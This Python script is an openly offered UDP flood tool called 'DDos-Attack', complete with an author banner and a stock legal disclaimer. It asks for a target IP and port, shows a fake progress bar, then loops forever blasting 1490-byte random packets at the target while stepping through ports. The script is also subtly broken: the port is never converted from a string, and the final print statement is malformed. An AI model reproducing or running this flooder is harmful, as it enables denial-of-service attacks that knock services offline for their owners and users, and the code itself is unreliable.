import sys

import os

import time

import socket

import random

#Code Time

from datetime import datetime

now = datetime.now()

hour = now.hour

minute = now.minute

day = now.day

month = now.month

year = now.year

##############

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)

#############

os.system("clear")

os.system("figlet DDos-Attack")

print("[+] Tool Namee:DDos-Attack")

print("[+] Author:Yousuf Shafi'i Muhammad. Junior Programmer")

print("[+] Version:1.0")

print("[+] Team:Junior Programmers")

print("[+] Github:https://github.com/Yousuf9963/phone-num-info")

print("[+] Follow me on Github: https://github.com/Yousuf9963")

print("[-] Website muhammadabdirahman.wixsite.com/yousuf9963blog.")

print("[!] legal disclaimer: Usage of this Program for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.")

print("[+] I hope for you good future and i am willing that you will come high effort.")

print("")

ip = input("IP Target : ")

port = input("Port       : ")

os.system("clear")

os.system("figlet Attack Starting")

print("[                    ] 0% ")

time.sleep(5)

print("[=====               ] 25%")

time.sleep(5)

print("[==========          ] 50%")

time.sleep(5)

print("[===============     ] 75%")

time.sleep(5)

print("[====================] 100%")

time.sleep(3)

sent = 0

while True:

     sock.sendto(bytes, (ip,port))

     sent = sent + 1

     port = port + 1

     print("Sent %s packet to %s throught port:%s%(sent,ip,port")

     if port == 65534:

       port = 1

